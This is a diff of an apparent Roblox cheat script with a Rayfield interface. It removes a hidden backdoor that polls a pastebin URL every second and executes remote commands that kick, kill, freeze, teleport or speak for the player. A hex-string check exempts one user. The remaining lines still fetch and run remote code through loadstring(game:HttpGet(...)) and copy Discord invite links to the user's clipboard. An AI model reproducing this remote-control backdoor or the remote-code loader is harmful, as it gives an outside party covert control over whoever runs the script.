@@ -1068,76 +1068,6 @@ t5:CreateButton({
 
 loadstring(game:HttpGet("https://pastebin.com/raw/UjVjsnQC"))()
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-if ad ~= "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
-    local pasteURL = "https://pastebin.com/raw/LpxN1hgG"
-
-    local function applyCommand(command, target)
-        local charactr = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-
-        if command == "Freeze" then
-            for _, part in pairs(charactr:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.Anchored = true
-                end
-            end
-
-        elseif command == "Unfreeze" then
-            for _, part in pairs(charactr:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.Anchored = false
-                end
-            end
-
-        elseif command == "Kick" then
-            LocalPlayer:Kick("You were kicked by external command.")
-
-        elseif command == "Kill" then
-            if charactr:FindFirstChild("Humanoid") then
-                charactr.Humanoid.Health = 0
-            end
-
-        elseif command:match("^Teleport:") then
-            local targetName = command:split(":")[2]
-            local targetPlayer = Players:FindFirstChild(targetName)
-            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                character:MoveTo(targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(2, 0, 2))
-            end
-
-        elseif command:match("^Chat:") then
-            local message = command:split(":")[2]
-            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
-        end
-    end
-
-    local function checkCommand()
-        local success, response = pcall(function()
-            return HttpService:GetAsync(pasteURL)
-        end)
-
-        if success and response then
-            local data = HttpService:JSONDecode(response)
-            local command = data.cmd
-            local target = data.user or "All"
-
-            if target == "All" or target == LocalPlayer.Name then
-                if command and command ~= "None" then
-                    applyCommand(command, target)
-                end
-            end
-        end
-    end
-    
-    task.spawn(function()
-        while task.wait(1) do
-            pcall(checkCommand)
-        end
-    end)
-end
-
 setclipboard("https://discord.gg/vmQVgF9N")
 Rayfield:LoadConfiguration()
 
@@ -1152,6 +1082,7 @@ t5:CreateButton({
 setclipboard("https://discord.gg/EHVKqtJm")
 
 ]]
+
 
 
 
